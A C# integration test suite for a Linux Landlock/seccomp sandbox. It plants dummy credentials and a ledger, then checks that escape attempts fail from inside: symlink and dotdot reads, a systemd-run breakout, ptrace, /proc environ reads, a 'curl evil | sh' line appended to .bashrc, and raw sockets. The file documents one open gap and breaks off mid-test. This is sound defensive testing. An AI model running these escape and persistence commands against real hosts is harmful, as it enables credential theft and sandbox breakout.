using System.Diagnostics;
using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using TradeAgent.AgentRuntime;
using TradeAgent.Core;
using TradeAgent.Security;
using Xunit;

namespace TradeAgent.Tests.Integration;

/// <summary>A row of the Linux cell benchmark: run on Linux, where a missing prerequisite FAILS; skipped elsewhere, where there is no cell.</summary>
public sealed class LinuxFactAttribute : FactAttribute
{
    public LinuxFactAttribute()
    {
        if (!OperatingSystem.IsLinux())
            Skip = "a Linux cell row: CI's ubuntu job runs it (Category=Cell); off Linux a cell is refused, which CellLaunchTests proves";
    }
}

/// <summary>
/// THE LINUX CELL, ROW BY ROW (<c>U-cell-linux-a</c> item 5; the § 9.3 benchmark rows the survey marked "yes", seat A's amendments).
///
/// <para><b>What is driven.</b> The product's own path: <see cref="ProcessContainment.Start(ProcessStartInfo, CellPolicy, IReadOnlyList{string}?, CellPlatform?)"/>
/// with the built <c>trade.dll</c> as the launcher, so every row goes through the supervisor, the cell stage, the policy file the
/// app wrote and the kernel's own Landlock and seccomp. Each row plants what a cell must not reach — a dummy ledger at
/// <c>state/tradeagent.db</c>, a holdout-shaped file, a dummy <c>~/.codex/auth.json</c> and <c>~/.ssh/id_x</c> under a test HOME,
/// listeners on the gateway pipe's own name and an abstract name, processes outside — and shows first that the same thing IS
/// reachable from outside the cell, so a denial inside proves the cell and not the fixture.</para>
///
/// <para><b>Never skipped on Linux.</b> A platform below Landlock ABI 6, no python3, no user systemd manager, no io_uring outside
/// the cell: each FAILS naming the prerequisite. CI runs this category alone, in the ubuntu job, under
/// <c>systemd-run -p User=runner -p Delegate=yes</c> (the host's shape) after <c>loginctl enable-linger runner</c>.</para>
/// </summary>
[Trait("Category", "Cell")]
public class CellLinuxTests
{
    const string LedgerSecret = "ledger-secret", HoldoutSecret = "holdout-secret", LoginSecret = "dummy-owner-login";

    /// <summary>The planted world of one row: a workspace, a read-only input, a test HOME with dummy logins, and the app's state.</summary>
    sealed class World
    {
        public World(string name)
        {
            Root = Path.Combine(TestEnv.Home, "cell-" + name + "-" + Guid.NewGuid().ToString("n")[..8]);
            Ws = Dir(Root, "ws");
            Ro = Dir(Root, "ro");
            Home = Dir(Root, "home");
            File.WriteAllText(Path.Combine(Ro, "in.txt"), "shared-input");
            File.WriteAllText(Path.Combine(Dir(Home, ".codex"), "auth.json"), LoginSecret);
            File.WriteAllText(Path.Combine(Dir(Home, ".ssh"), "id_x"), LoginSecret);
            File.WriteAllText(Path.Combine(Home, ".bashrc"), "# the owner's\n");
            Dir(Path.Combine(Home, ".config"), "systemd/user");

            // THE APP'S OWN STATE, AT ITS OWN PATH: the ledger a cell must never read, and a holdout-shaped file beside the data.
            if (!File.Exists(Paths.DatabaseFile)) File.WriteAllText(Paths.DatabaseFile, LedgerSecret);
            Holdout = Path.Combine(Dir(Paths.State, "data"), $"holdout-{Guid.NewGuid():n}.csv");
            File.WriteAllText(Holdout, HoldoutSecret);
        }

        public string Root { get; }
        public string Ws { get; }
        public string Ro { get; }
        public string Home { get; }
        public string Holdout { get; }
        public static string Ledger => Paths.DatabaseFile;

        public CellPolicy Policy(IEnumerable<int>? tcp = null, IEnumerable<KeyValuePair<string, string>>? more = null) =>
            new(Ws, [Ro], CellPolicy.SystemRoots,
            [
                new("PATH", "/usr/local/bin:/usr/bin:/bin"), new("HOME", Home), new("LANG", "C.UTF-8"), new("TMPDIR", Ws),
                new("XDG_RUNTIME_DIR", RuntimeDir), .. more ?? []
            ], tcp);

        /// <summary>Writes a probe script into the workspace (from outside) and returns its path.</summary>
        public string Script(string name, string text)
        {
            var p = Path.Combine(Ws, name);
            File.WriteAllText(p, text);
            return p;
        }

        static string Dir(string parent, string name)
        {
            var d = Path.Combine(parent, name);
            Directory.CreateDirectory(d);
            return d;
        }
    }

    static string RuntimeDir => Environment.GetEnvironmentVariable("XDG_RUNTIME_DIR") is { Length: > 0 } d ? d : $"/run/user/{Uid()}";

    static string Uid() => File.ReadAllLines("/proc/self/status").First(l => l.StartsWith("Uid:", StringComparison.Ordinal)).Split('\t', StringSplitOptions.RemoveEmptyEntries)[1];

    static IReadOnlyList<string> Launcher()
    {
        var host = Environment.GetEnvironmentVariable("DOTNET_HOST_PATH");
        if (string.IsNullOrWhiteSpace(host) || !File.Exists(host)) host = Environment.ProcessPath!;
        return [host, Build.TradeCliDll];
    }

    static void Require(bool ok, string what) => Assert.True(ok, $"missing prerequisite for the Cell rows: {what}");

    /// <summary>The platform must be one a cell runs on: a runner below Landlock ABI 6 fails here, it is never skipped.</summary>
    static void PlatformIsACells()
    {
        var platform = CellPlatform.Read();
        Require(platform.Refusal() is null, platform.Refusal() ?? "");
        Require(File.Exists("/usr/bin/python3"), "/usr/bin/python3");
    }

    sealed record Ran(int Code, string Out, string Err, string Mechanism);

    /// <summary>Runs <paramref name="program"/> in a cell under <paramref name="policy"/>, through the product's launcher, and waits for it.</summary>
    static async Task<Ran> InCell(CellPolicy policy, string program, params string[] args)
    {
        var psi = new ProcessStartInfo(program)
        {
            UseShellExecute = false, CreateNoWindow = true,
            RedirectStandardInput = true, RedirectStandardOutput = true, RedirectStandardError = true
        };
        foreach (var a in args) psi.ArgumentList.Add(a);
        using var held = ProcessContainment.Start(psi, policy, Launcher());
        Assert.NotNull(held.Cell);
        Assert.Equal(policy.Hash, held.Cell!.PolicyHash);
        held.Process.StandardInput.Close();
        var so = held.Process.StandardOutput.ReadToEndAsync();
        var se = held.Process.StandardError.ReadToEndAsync();
        try { await held.Process.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(90)); }
        catch (TimeoutException) { Assert.Fail($"the cell did not finish in 90 s; stderr so far: {(se.IsCompleted ? await se : "")}"); }
        return new Ran(held.Process.ExitCode, await so, await se, held.Mechanism);
    }

    /// <summary>The same program OUTSIDE any cell, as the test's own user: the control that shows a planted thing is reachable at all.</summary>
    static async Task<Ran> Outside(string program, params string[] args)
    {
        var psi = new ProcessStartInfo(program)
        {
            UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true
        };
        foreach (var a in args) psi.ArgumentList.Add(a);
        psi.Environment["XDG_RUNTIME_DIR"] = RuntimeDir;
        using var p = Process.Start(psi)!;
        var so = p.StandardOutput.ReadToEndAsync();
        var se = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(90));
        return new Ran(p.ExitCode, await so, await se, "outside");
    }

    static void Says(Ran ran, params string[] lines)
    {
        foreach (var line in lines)
            Assert.True(ran.Out.Split('\n').Contains(line),
                $"expected the line '{line}'.\n--- stdout ---\n{ran.Out}\n--- stderr ---\n{ran.Err}");
    }

    const string TryRead = """
        import sys
        for p in sys.argv[1:]:
            try:
                open(p, "rb").read(); print("read-open " + p)
            except PermissionError:
                print("read-denied " + p)
        """;

    // ---- workspace, read-only, state/ and secrets ---------------------------------------------------------------

    [LinuxFact]
    public async Task A_cell_reads_writes_and_runs_inside_its_workspace()
    {
        PlatformIsACells();
        var w = new World("ws");
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            "echo hi > made && cat made && mkdir d && mv made d/moved && cp /bin/true ./t && ./t && echo ran-from-workspace && pwd");
        Assert.Equal(0, ran.Code);
        Says(ran, "hi", "ran-from-workspace", w.Ws);
        Assert.Contains("a cell (Landlock ABI", ran.Mechanism);
        Assert.True(File.Exists(Path.Combine(w.Ws, "d", "moved")));
    }

    [LinuxFact]
    public async Task A_cell_reads_its_inputs_and_cannot_change_them()
    {
        PlatformIsACells();
        var w = new World("ro");
        var input = Path.Combine(w.Ro, "in.txt");
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            $"cat '{input}' && echo; " +
            $"echo x >> '{input}' 2>/dev/null && echo append-open || echo append-denied; " +
            // In a subshell: a failed redirection on the special built-in `:` ends a POSIX shell, and the rows after it with it.
            $"( : > '{input}' ) 2>/dev/null && echo truncate-open || echo truncate-denied; " +
            $"rm -f '{input}' 2>/dev/null && echo unlink-open || echo unlink-denied; " +
            $"echo x > '{w.Ro}/new' 2>/dev/null && echo create-open || echo create-denied");
        Says(ran, "shared-input", "append-denied", "truncate-denied", "unlink-denied", "create-denied");
        Assert.Equal("shared-input", File.ReadAllText(input));
        Assert.False(File.Exists(Path.Combine(w.Ro, "new")));
    }

    [LinuxFact]
    public async Task A_cell_cannot_read_or_write_state_or_the_owners_login()
    {
        PlatformIsACells();
        var w = new World("state");
        var ledgerBefore = File.ReadAllBytes(World.Ledger);
        var auth = Path.Combine(w.Home, ".codex", "auth.json");
        var ssh = Path.Combine(w.Home, ".ssh", "id_x");
        var probe = w.Script("read.py", TryRead);

        var control = await Outside("/usr/bin/python3", "-I", probe, World.Ledger, w.Holdout, auth, ssh);
        Says(control, $"read-open {World.Ledger}", $"read-open {w.Holdout}", $"read-open {auth}", $"read-open {ssh}");

        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe, World.Ledger, w.Holdout, auth, ssh, Paths.IpcTokenFile);
        Says(ran, $"read-denied {World.Ledger}", $"read-denied {w.Holdout}", $"read-denied {auth}", $"read-denied {ssh}");
        Assert.DoesNotContain("read-open", ran.Out);

        var write = await InCell(w.Policy(), "/bin/sh", "-c",
            $"echo x >> '{World.Ledger}' 2>/dev/null && echo ledger-append-open || echo ledger-append-denied; " +
            $"echo x > '{w.Holdout}' 2>/dev/null && echo holdout-write-open || echo holdout-write-denied; " +
            $"echo x > '{Paths.State}/planted' 2>/dev/null && echo state-create-open || echo state-create-denied; " +
            $"echo x > '{CellPolicy.Directory}/planted' 2>/dev/null && echo policy-create-open || echo policy-create-denied");
        Says(write, "ledger-append-denied", "holdout-write-denied", "state-create-denied", "policy-create-denied");
        Assert.Equal(ledgerBefore, File.ReadAllBytes(World.Ledger));
        Assert.Equal(HoldoutSecret, File.ReadAllText(w.Holdout));
    }

    [LinuxFact]
    public async Task A_cell_cannot_escape_by_symlink_hardlink_rename_or_dotdot()
    {
        PlatformIsACells();
        var w = new World("escape");
        var outside = Path.Combine(w.Root, "outside.txt");
        File.WriteAllText(outside, LedgerSecret);
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            $"ln -s '{World.Ledger}' l && (cat l > /dev/null 2>&1 && echo symlink-open || echo symlink-denied); " +
            $"ln '{outside}' h 2>/dev/null && echo hardlink-open || echo hardlink-denied; " +
            $"echo x > f && (mv f '{w.Root}/moved' 2>/dev/null && echo rename-out-open || echo rename-out-denied); " +
            $"mv '{outside}' ./in 2>/dev/null && echo rename-in-open || echo rename-in-denied; " +
            $"mkdir -p a/b && cd a/b && (cat ../../../home/.ssh/id_x > /dev/null 2>&1 && echo dotdot-open || echo dotdot-denied)");
        Says(ran, "symlink-denied", "hardlink-denied", "rename-out-denied", "rename-in-denied", "dotdot-denied");
        Assert.False(File.Exists(Path.Combine(w.Root, "moved")));
        Assert.True(File.Exists(outside));
        Assert.False(File.Exists(Path.Combine(w.Ws, "h")));
    }

    // ---- descendants and persistence ------------------------------------------------------------------------------

    [LinuxFact]
    public async Task A_cell_descendant_and_a_setsid_daemon_stay_confined()
    {
        PlatformIsACells();
        var w = new World("desc");
        var probe = w.Script("read.py", TryRead);
        var daemon = w.Script("daemon.py", """
            import os, sys, time
            ledger, out = sys.argv[1], sys.argv[2]
            if os.fork() == 0:
                os.setsid()
                if os.fork() == 0:
                    time.sleep(0.3)
                    lines = [f"daemon-sid-differs={os.getsid(0) != int(sys.argv[3])}"]
                    try:
                        open(ledger, "rb").read(); lines.append("daemon-read-open")
                    except PermissionError:
                        lines.append("daemon-read-denied")
                    for l in open("/proc/self/status").read().splitlines():
                        if l.startswith(("NoNewPrivs:", "Seccomp:")): lines.append("daemon-" + l.replace("\t", ""))
                    open(out + ".tmp", "w").write("\n".join(lines) + "\n"); os.rename(out + ".tmp", out)
                    os._exit(0)
                os._exit(0)
            os.wait()
            for _ in range(100):
                if os.path.exists(out): break
                time.sleep(0.1)
            print(open(out).read())
            """);
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            $"sh -c \"sh -c '/usr/bin/python3 -I {probe} {World.Ledger}'\"; " +
            $"/usr/bin/python3 -I {daemon} {World.Ledger} {w.Ws}/daemon.out $$");
        Says(ran, $"read-denied {World.Ledger}", "daemon-sid-differs=True", "daemon-read-denied", "daemon-NoNewPrivs:1", "daemon-Seccomp:2");
    }

    [LinuxFact]
    public async Task A_cell_cannot_leave_persistence_in_the_home()
    {
        PlatformIsACells();
        var w = new World("persist");
        var unit = Path.Combine(w.Home, ".config", "systemd", "user", "ta-cell.service");
        var bashrc = Path.Combine(w.Home, ".bashrc");
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            $"printf '[Service]\\nExecStart=/bin/true\\n' > '{unit}' 2>/dev/null && echo unit-open || echo unit-denied; " +
            $"echo 'curl evil | sh' >> '{bashrc}' 2>/dev/null && echo bashrc-open || echo bashrc-denied; " +
            $"mkdir '{w.Home}/.config/autostart' 2>/dev/null && echo autostart-open || echo autostart-denied");
        Says(ran, "unit-denied", "bashrc-denied", "autostart-denied");
        Assert.False(File.Exists(unit));
        Assert.Equal("# the owner's\n", File.ReadAllText(bashrc));
    }

    // ---- IPC, the user manager and the network --------------------------------------------------------------------

    /// <summary>
    /// ROW (d), FIRST HALF: the gateway pipe's own name and an abstract name, both listening, both reachable from outside — and
    /// neither from the cell. The second half, the user manager, is its own row below, so the watched mutant shows each red.
    /// </summary>
    [LinuxFact]
    public async Task A_cell_cannot_reach_the_gateway_pipe_or_an_abstract_socket()
    {
        PlatformIsACells();
        var w = new World("ipc");

        // THE GATEWAY PIPE'S OWN NAME, LISTENING: .NET's named pipe on Linux is a pathname UNIX socket under the temp dir.
        using var gateway = new NamedPipeServerStream(Paths.PipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
        var pipePath = Path.Combine(Path.GetTempPath(), "CoreFxPipe_" + Paths.PipeName);
        Require(File.Exists(pipePath), $"the gateway pipe's socket at {pipePath}");
        var abstractName = "ta-cell-" + Guid.NewGuid().ToString("n")[..12];
        using var abstractListener = new Socket(AddressFamily.Unix, SocketType.Stream, ProtocolType.Unspecified);
        abstractListener.Bind(new UnixDomainSocketEndPoint("\0" + abstractName));
        abstractListener.Listen(8);

        var connect = w.Script("connect.py", """
            import socket, sys
            for name, addr in (("gateway-pipe", sys.argv[1]), ("abstract", "\0" + sys.argv[2])):
                try:
                    s = socket.socket(socket.AF_UNIX); s.connect(addr); print(name + "-connected")
                except OSError as e:
                    print(f"{name}-denied errno={e.errno}")
            """);
        var control = await Outside("/usr/bin/python3", "-I", connect, pipePath, abstractName);
        Says(control, "gateway-pipe-connected", "abstract-connected");

        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", connect, pipePath, abstractName);
        Says(ran, "gateway-pipe-denied errno=13", "abstract-denied errno=13");
    }

    /// <summary>
    /// ROW (d), SECOND HALF — THE SURVEY'S ESCAPE, the reason the <c>socket(AF_UNIX)</c> rule exists: without it a cell asked the
    /// user's systemd manager to run a command OUTSIDE the cell, and that command copied a planted <c>state/</c> ledger into the
    /// workspace. The manager is real (lingering) and does run the same command for the test's own user outside the cell.
    /// </summary>
    [LinuxFact]
    public async Task A_cell_cannot_escape_through_the_user_manager_to_read_the_ledger()
    {
        PlatformIsACells();
        var w = new World("manager");
        var outsideCopy = Path.Combine(w.Root, "outside-copy");
        var manager = await Outside("/usr/bin/systemd-run", "--user", "--wait", "--quiet", "/bin/sh", "-c", $"cat '{World.Ledger}' > '{outsideCopy}'");
        Require(manager.Code == 0 && File.Exists(outsideCopy),
            $"a user systemd manager for this account that runs a command outside (loginctl enable-linger): systemd-run --user said {manager.Err.Trim()}");

        var leak = Path.Combine(w.Ws, "leak");
        var escape = await InCell(w.Policy(), "/bin/sh", "-c",
            $"systemd-run --user --wait --quiet /bin/sh -c \"cat '{World.Ledger}' > '{leak}'\"; echo systemd-run-rc=$?");
        Assert.DoesNotContain("systemd-run-rc=0", escape.Out);
        Assert.False(File.Exists(leak), $"the user manager ran a command outside the cell, which wrote {leak}: {escape.Out}{escape.Err}");
    }

    [LinuxFact]
    public async Task A_cell_connects_tcp_only_to_a_port_it_was_granted()
    {
        PlatformIsACells();
        var w = new World("tcp");
        using var denied = new TcpListener(IPAddress.Loopback, 0);
        using var granted = new TcpListener(IPAddress.Loopback, 0);
        denied.Start();
        granted.Start();
        var deniedPort = ((IPEndPoint)denied.LocalEndpoint).Port;
        var grantedPort = ((IPEndPoint)granted.LocalEndpoint).Port;
        var probe = w.Script("tcp.py", """
            import socket, sys
            for port in sys.argv[1:]:
                try:
                    socket.create_connection(("127.0.0.1", int(port)), 5); print(f"tcp-{port}-connected")
                except OSError as e:
                    print(f"tcp-{port}-denied errno={e.errno}")
            try:
                s = socket.socket(); s.bind(("127.0.0.1", 0)); print("bind-open")
            except OSError as e:
                print(f"bind-denied errno={e.errno}")
            """);
        var control = await Outside("/usr/bin/python3", "-I", probe, $"{deniedPort}");
        Says(control, $"tcp-{deniedPort}-connected");

        var ran = await InCell(w.Policy(tcp: [grantedPort]), "/usr/bin/python3", "-I", probe, $"{deniedPort}", $"{grantedPort}");
        Says(ran, $"tcp-{deniedPort}-denied errno=13", $"tcp-{grantedPort}-connected", "bind-denied errno=13");
    }

    [LinuxFact]
    public async Task A_cell_cannot_send_udp_or_open_a_netlink_or_packet_socket()
    {
        PlatformIsACells();
        var w = new World("udp");
        var probe = w.Script("families.py", """
            import socket
            tries = [("udp", socket.AF_INET, socket.SOCK_DGRAM, 0), ("udp6", socket.AF_INET6, socket.SOCK_DGRAM, 0),
                     ("icmp", socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP), ("netlink", socket.AF_NETLINK, socket.SOCK_RAW, 0),
                     ("packet", socket.AF_PACKET, socket.SOCK_RAW, 0), ("vsock", 40, socket.SOCK_STREAM, 0),
                     ("sctp", socket.AF_INET, socket.SOCK_STREAM, 132), ("raw", socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)]
            for name, family, kind, proto in tries:
                try:
                    s = socket.socket(family, kind, proto); print(name + "-open")
                    if name == "udp": s.sendto(b"x", ("127.0.0.1", 9)); print("udp-sent")
                except OSError as e:
                    print(f"{name}-denied errno={e.errno}")
            """);
        var control = await Outside("/usr/bin/python3", "-I", probe);
        Says(control, "udp-open", "udp-sent", "netlink-open");

        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe);
        Says(ran, "udp-denied errno=13", "udp6-denied errno=13", "icmp-denied errno=13", "netlink-denied errno=13",
            "packet-denied errno=13", "vsock-denied errno=13", "sctp-denied errno=13", "raw-denied errno=13");
        Assert.DoesNotContain("-open", ran.Out);
    }

    [LinuxFact]
    public async Task A_cell_runtime_keeps_a_connected_socketpair()
    {
        PlatformIsACells();
        var w = new World("pair");
        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", "-c",
            "import socket; a, b = socket.socketpair(); a.send(b'wake'); print('pair-' + b.recv(4).decode())");
        Says(ran, "pair-wake");
    }

    /// <summary>
    /// A DATAGRAM PAIR IS REFUSED (triage #1): an AF_UNIX datagram socket from a pair can be re-<c>connect</c>ed, or <c>sendto</c>'d,
    /// to any pathname datagram listener on the host — journald, <c>/dev/log</c>, a notify socket — so seccomp allows
    /// <c>socketpair()</c> for stream and seqpacket pairs only. Outside the cell the same pair opens.
    /// </summary>
    [LinuxFact]
    public async Task A_cell_cannot_make_a_datagram_socketpair()
    {
        PlatformIsACells();
        var w = new World("dgrampair");
        var probe = w.Script("dgrampair.py", """
            import socket
            for name, kind in (("dgram", socket.SOCK_DGRAM), ("dgram-flags", socket.SOCK_DGRAM | socket.SOCK_NONBLOCK | socket.SOCK_CLOEXEC)):
                try:
                    socket.socketpair(socket.AF_UNIX, kind); print(name + "-pair-open")
                except OSError as e:
                    print(f"{name}-pair-denied errno={e.errno}")
            """);
        var control = await Outside("/usr/bin/python3", "-I", probe);
        Says(control, "dgram-pair-open", "dgram-flags-pair-open");

        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe);
        Says(ran, "dgram-pair-denied errno=13", "dgram-flags-pair-denied errno=13");
        Assert.DoesNotContain("-pair-open", ran.Out);
    }

    /// <summary>The pairs runtimes wake themselves with still work in a cell: stream and seqpacket, with or without their flags.</summary>
    [LinuxFact]
    public async Task A_cell_stream_socketpair_still_works()
    {
        PlatformIsACells();
        var w = new World("streampair");
        var probe = w.Script("streampair.py", """
            import socket
            for name, kind in (("stream", socket.SOCK_STREAM), ("seqpacket", socket.SOCK_SEQPACKET),
                               ("stream-flags", socket.SOCK_STREAM | socket.SOCK_NONBLOCK | socket.SOCK_CLOEXEC)):
                a, b = socket.socketpair(socket.AF_UNIX, kind); a.send(b"wake"); print(f"{name}-pair-" + b.recv(4).decode())
            """);
        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe);
        Assert.Equal(0, ran.Code);
        Says(ran, "stream-pair-wake", "seqpacket-pair-wake", "stream-flags-pair-wake");
    }

    /// <summary>
    /// A STREAM OR SEQPACKET PAIR END REACHES ONLY ITS PEER (triage #1): <c>connect</c> on a connected stream end is EISCONN before
    /// anything is queued at the listener, a stream end's <c>sendto</c> with an address is EISCONN, and a seqpacket end's address is
    /// ignored for its peer. Planted OUTSIDE the workspace: a pathname stream listener and a pathname datagram receiver, both shown
    /// reachable from outside first — and neither gets anything from the cell.
    /// </summary>
    [LinuxFact]
    public async Task A_cell_stream_pair_end_cannot_connect_or_sendto_a_pathname_socket()
    {
        PlatformIsACells();
        var w = new World("pairend");
        var listenerPath = Path.Combine(w.Root, "listener.sock");
        var receiverPath = Path.Combine(w.Root, "receiver.sock");
        using var listener = new Socket(AddressFamily.Unix, SocketType.Stream, ProtocolType.Unspecified);
        listener.Bind(new UnixDomainSocketEndPoint(listenerPath));
        listener.Listen(8);
        using var receiver = new Socket(AddressFamily.Unix, SocketType.Dgram, ProtocolType.Unspecified);
        receiver.Bind(new UnixDomainSocketEndPoint(receiverPath));

        var control = await Outside("/usr/bin/python3", "-I", "-c",
            "import socket, sys; s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM); s.sendto(b'control', sys.argv[2]); print('control-sent'); " +
            "t = socket.socket(socket.AF_UNIX); t.connect(sys.argv[1]); print('control-connected')", listenerPath, receiverPath);
        Says(control, "control-sent", "control-connected");
        Require(receiver.Poll(TimeSpan.FromSeconds(5), SelectMode.SelectRead), "the planted datagram receiver reachable from outside the cell");
        var got = new byte[64];
        Assert.Equal("control", System.Text.Encoding.ASCII.GetString(got, 0, receiver.Receive(got)));
        Require(listener.Poll(TimeSpan.FromSeconds(5), SelectMode.SelectRead), "the planted stream listener reachable from outside the cell");
        listener.Accept().Dispose();

        var probe = w.Script("pairend.py", """
            import socket, sys
            listener, receiver = sys.argv[1], sys.argv[2]
            a, b = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
            for name, act in (("stream-connect", lambda: a.connect(listener)), ("stream-sendto", lambda: a.sendto(b"leak", receiver))):
                try:
                    act(); print(name + "-reached")
                except OSError as e:
                    print(f"{name}-refused errno={e.errno}")
            c, d = socket.socketpair(socket.AF_UNIX, socket.SOCK_SEQPACKET)
            try:
                c.sendto(b"leak", receiver); print("seqpacket-sendto-went-to-" + ("its-peer" if d.recv(8) == b"leak" else "elsewhere"))
            except OSError as e:
                print(f"seqpacket-sendto-refused errno={e.errno}")
            """);
        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe, listenerPath, receiverPath);
        // EISCONN (106) on Landlock ABI 7 and 8; from ABI 9 RESOLVE_UNIX may refuse the lookup first with EACCES (13). Either holds.
        foreach (var name in new[] { "stream-connect", "stream-sendto" })
            Assert.True(ran.Out.Contains($"{name}-refused errno=106") || ran.Out.Contains($"{name}-refused errno=13"),
                $"expected {name} refused with EISCONN or EACCES.\n--- stdout ---\n{ran.Out}\n--- stderr ---\n{ran.Err}");
        Assert.DoesNotContain("-reached", ran.Out);
        Assert.DoesNotContain("went-to-elsewhere", ran.Out);
        Assert.False(receiver.Poll(TimeSpan.FromSeconds(1), SelectMode.SelectRead), "the outside datagram receiver got something from the cell");
        Assert.False(listener.Poll(TimeSpan.FromSeconds(1), SelectMode.SelectRead), "the outside stream listener got a connection from the cell");
    }

    [LinuxFact]
    public async Task A_cell_cannot_use_io_uring()
    {
        PlatformIsACells();
        var w = new World("uring");
        var probe = w.Script("uring.py", """
            import ctypes
            libc = ctypes.CDLL(None, use_errno=True)
            params = ctypes.create_string_buffer(120)
            fd = libc.syscall(425, 4, params)
            print("io_uring-open" if fd >= 0 else f"io_uring-denied errno={ctypes.get_errno()}")
            """);
        var control = await Outside("/usr/bin/python3", "-I", probe);
        Require(control.Out.Contains("io_uring-open"),
            $"io_uring outside the cell, so its denial inside means the filter (kernel.io_uring_disabled?): {control.Out}{control.Err}");

        var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe);
        Says(ran, "io_uring-denied errno=1");
    }

    // ---- other processes, the terminal, the stage itself ----------------------------------------------------------

    [LinuxFact]
    public async Task A_cell_cannot_signal_trace_or_read_the_environment_of_an_outside_process()
    {
        PlatformIsACells();
        var w = new World("procs");
        var psi = new ProcessStartInfo("/bin/sleep") { UseShellExecute = false };
        psi.ArgumentList.Add("120");
        psi.Environment["TA_CELL_OUTSIDE_SECRET"] = "outside-env-secret";
        using var neighbour = Process.Start(psi)!;
        try
        {
            Require(File.ReadAllText($"/proc/{neighbour.Id}/environ").Contains("outside-env-secret"),
                "the outside process's environment readable from outside the cell");
            var probe = w.Script("procs.py", """
                import ctypes, os, subprocess, sys
                libc = ctypes.CDLL(None, use_errno=True)
                for pid in map(int, sys.argv[1:]):
                    try:
                        open(f"/proc/{pid}/environ", "rb").read(); print(f"environ-{pid}-open")
                    except PermissionError:
                        print(f"environ-{pid}-denied")
                    try:
                        os.kill(pid, 0); print(f"signal-{pid}-sent")
                    except PermissionError:
                        print(f"signal-{pid}-denied")
                    if libc.ptrace(16, pid, 0, 0) == 0:
                        print(f"ptrace-{pid}-attached"); libc.ptrace(17, pid, 0, 0)
                    else:
                        print(f"ptrace-{pid}-denied")
                own = subprocess.Popen(["/bin/sleep", "30"])
                os.kill(own.pid, 15); own.wait(); print("signal-own-child-sent")
                """);
            var app = Environment.ProcessId;
            var ran = await InCell(w.Policy(), "/usr/bin/python3", "-I", probe, $"{neighbour.Id}", $"{app}");
            Says(ran,
                $"environ-{neighbour.Id}-denied", $"signal-{neighbour.Id}-denied", $"ptrace-{neighbour.Id}-denied",
                $"environ-{app}-denied", $"signal-{app}-denied", $"ptrace-{app}-denied",
                "signal-own-child-sent");
            Assert.False(neighbour.HasExited);
        }
        finally { try { neighbour.Kill(); } catch (Exception) { /* gone */ } }
    }

    /// <summary>
    /// THE RECORDED GAP (seat A's amendment v): with no mount namespace there is no <c>hidepid</c>, so a cell reads the command line of
    /// every process of its user. Asserted AS OPEN, so the day it closes this turns red and the profile is updated; until then no
    /// secret may ride an argv (<c>U-prompt-stdin</c>).
    /// </summary>
    [LinuxFact]
    public async Task A_cell_can_still_read_another_process_command_line_a_recorded_gap()
    {
        PlatformIsACells();
        var w = new World("cmdline");
        using var neighbour = Process.Start(new ProcessStartInfo("/bin/sleep", ["121"]) { UseShellExecute = false })!;
        try
        {
            var ran = await InCell(w.Policy(), "/bin/sh", "-c", $"tr '\\0' ' ' < /proc/{neighbour.Id}/cmdline; echo");
            Assert.Contains("/bin/sleep 121", ran.Out);
        }
        finally { try { neighbour.Kill(); } catch (Exception) { /* gone */ } }
    }

    [LinuxFact]
    public async Task A_cell_has_no_terminal_no_new_privileges_and_a_seccomp_filter()
    {
        PlatformIsACells();
        var w = new World("status");
        var ran = await InCell(w.Policy(), "/bin/sh", "-c",
            "grep -E '^(NoNewPrivs|Seccomp):' /proc/self/status | tr -d '\\t'; " +
            "echo tty_nr=$(cut -d' ' -f7 /proc/self/stat); " +
            "(cat /dev/tty > /dev/null 2>&1 < /dev/null) && echo devtty-open || echo devtty-denied; " +
            "test -t 0 || test -t 1 || echo no-tty-on-stdio");
        Says(ran, "NoNewPrivs:1", "Seccomp:2", "tty_nr=0", "devtty-denied", "no-tty-on-stdio");
    }

    [LinuxFact]
    public async Task A_cell_starts_with_the_policys_environment_and_nothing_else()
    {
        PlatformIsACells();
        var w = new World("env");
        Require(Environment.GetEnvironmentVariable(AgentGrants.Variable) is { Length: > 0 }, "a launch grant in the test process's environment");
        var ran = await InCell(w.Policy(more: [new("TA_CELL_GIVEN", "yes")]), "/bin/sh", "-c",
            "env | cut -d= -f1 | sort | tr '\\n' ' '; echo; ls /proc/self/fd | tr '\\n' ' '; echo");
        var names = ran.Out.Split('\n')[0].Split(' ', StringSplitOptions.RemoveEmptyEntries)
            .Where(n => n is not ("PWD" or "SHLVL" or "_" or "OLDPWD")).ToArray();
        Assert.Equal(["HOME", "LANG", "PATH", "TA_CELL_GIVEN", "TMPDIR", "XDG_RUNTIME_DIR"], names);
        Assert.DoesNotContain(AgentGrants.Variable, ran.Out);
        var fds = ran.Out.Split('\n')[1].Split(' ', StringSplitOptions.RemoveEmptyEntries);
        Assert.All(fds, fd => Assert.Contains(fd, new[] { "0", "1", "2", "3" }));
    }

    /// <summary>One policy file per launch, in the app's own cell folder while the cell runs, and gone once it has exited or been killed (triage #6).</summary>
    [LinuxFact]
    public async Task A_cell_policy_file_is_removed_after_the_cell_exits()
    {
        PlatformIsACells();
        var w = new World("discard");
        var psi = new ProcessStartInfo("/bin/sh") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardInput = true };
        psi.ArgumentList.Add("-c");
        psi.ArgumentList.Add("sleep 2");
